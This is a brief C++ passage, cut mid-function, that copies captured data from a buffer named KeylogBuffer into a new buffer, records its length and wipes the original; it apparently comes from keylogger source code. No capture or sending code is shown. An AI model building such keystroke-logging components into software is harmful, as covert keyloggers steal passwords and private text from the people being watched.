        newBuffer = new char[i];

        // Copy data from the keylog buffer to the new buffer
        memcpy(newBuffer, KeylogBuffer, i);

        // Set the length of the data
        *length = i;

        // Reset the keylog buffer
        memset(KeylogBuffer, 0, KEYLOG_BUFFER_SIZE);
        i = 0;
